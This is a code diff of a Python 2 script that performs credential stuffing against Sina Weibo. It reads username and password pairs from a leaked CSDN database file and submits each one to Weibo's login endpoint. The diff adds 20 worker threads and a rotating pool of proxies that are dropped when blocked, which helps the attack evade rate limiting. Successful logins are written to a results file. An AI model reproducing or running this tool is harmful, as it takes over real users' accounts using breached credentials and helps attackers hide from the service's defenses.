@@ -1,9 +1,9 @@
-
-import urllib, urllib2, json, base64, rsa, time, binascii
+import urllib, urllib2, json, base64, rsa, time, binascii, random
 import cookielib
 import re
 import hashlib
 from Loginer import Session
+import threading,traceback
 
 headers = {'User-Agent': 'Mozilla/5.0'}
 
@@ -32,7 +32,7 @@ postdata = {'entry': 'weibo',
 def sinaEncryptMsg(pubkey, msg, servertime, nonce):
 	rsaPublickey = int(pubkey, 16)  
 	key = rsa.PublicKey(rsaPublickey, 65537) 
-	message = str(servertime) + '\t' + str(nonce) + '\n' + str(password)
+	message = str(servertime) + '\t' + str(nonce) + '\n' + str(msg)
 	passwd = rsa.encrypt(message, key) 
 	passwd = binascii.b2a_hex(passwd)
 	return passwd
@@ -43,40 +43,93 @@ loginUrl = 'http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.4.18)'
 
 f = open('/Users/kindai/Desktop/www.csdn.net.sql','r')
 f2 = open('./out.txt','w')
+f3 = open('proxyok.txt','r')
+proxies=[]
+valids=[]
+locks=[]
+count=0
 while 1:
-	line = f.readline()
+	line=f3.readline()
 	if not line:
 		break
-	username = line[line.rfind('# ')+2:-2]
-	password = line[line.find('# ')+2:line.rfind(' #')]
+	proxies.append(line)
+	valids.append(True)
+	locks.append(threading.Lock())
+	count+=1
 
-	s = Session()
-	s.open('http://weibo.com/')
+class mythread(threading.Thread):
+	def __init__(self):  
+		threading.Thread.__init__(self) 
+	def run(self):
+		while 1:
+			line = f.readline()
+			if not line:
+				break
+			username = line[line.rfind('# ')+2:-2]
+			password = line[line.find('# ')+2:line.rfind(' #')]
 
-	res = s.open(servertimeUrl)
-	t = long(time.time()/1000)
-	con = res.read()
-	js = eval(con[35:-1])
-	servertime=js['servertime']
-	pubkey=js['pubkey']
-	nonce=js['nonce']
+			index=0
+			try:
+				while 1:
+					index=int(random.random()*count)
+					if valids[index]:
+						locks[index].acquire()
+						if valids[index]:
+							locks[index].release()
+							break
 
-	su = base64.encodestring(urllib.quote(username))[:-1]
-	servertime = servertime + long(long(servertime)/1000) - t
+				proxy = proxies[index]
+				s = Session(proxy,0)
+				s.open('http://weibo.com/')
 
-	sp = sinaEncryptMsg(pubkey, password, servertime, nonce)
+				res = s.open(servertimeUrl)
+				t = long(time.time()/1000)
+				con = res.read()
+				js = eval(con[35:-1])
+				servertime=js['servertime']
+				pubkey=js['pubkey']
+				nonce=js['nonce']
 
-	postdata['nonce'] = nonce
-	postdata['servertime'] = servertime
-	postdata['su']=su
-	postdata['sp']=sp
-	postdata['rsakv'] = js['rsakv']
+				su = base64.encodestring(urllib.quote(username))[:-1]
+				servertime = servertime + long(long(servertime)/1000) - t
 
-	login_data = urllib.urlencode(postdata)
-	res = s.open(loginUrl, login_data)
-	con = res.read()
-	retcode = con[con.find('retcode=')+8:con.find('&',con.find('retcode='))]
-	if retcode == '1':
-		print >>f2, username+':'+password+':success'
-	else:
-		print >>f2, username+':'+password+':failed'
+				sp = sinaEncryptMsg(pubkey, password, servertime, nonce)
+
+				postdata['nonce'] = nonce
+				postdata['servertime'] = servertime
+				postdata['su']=su
+				postdata['sp']=sp
+				postdata['rsakv'] = js['rsakv']
+
+				login_data = urllib.urlencode(postdata)
+				res = s.open(loginUrl, login_data)
+				con = res.read()
+				retcode = con[con.find('retcode=')+8:con.find('&',con.find('retcode='))]
+				print username+':'+password + ':' + retcode
+				if retcode == '1':
+					print >>f2, username+':'+password+':success'
+				else:
+					print >>f2, username+':'+password+':failed' + retcode
+				f2.flush()
+			except:
+				exstr = traceback.format_exc()
+				print exstr
+				print 'proxy failed!' + proxy
+				print 'invalidating proxy: '+proxy
+				locks[index].acquire()
+				valids[index]=False
+				locks[index].release()
+
+tc = 20
+threads = []
+for i in range(1, tc+1):
+	t = mythread()
+	threads.append(t)
+	t.start()
+
+for thread in threads:
+	thread.join()
+
+f.close()
+f2.close()
+f3.close()
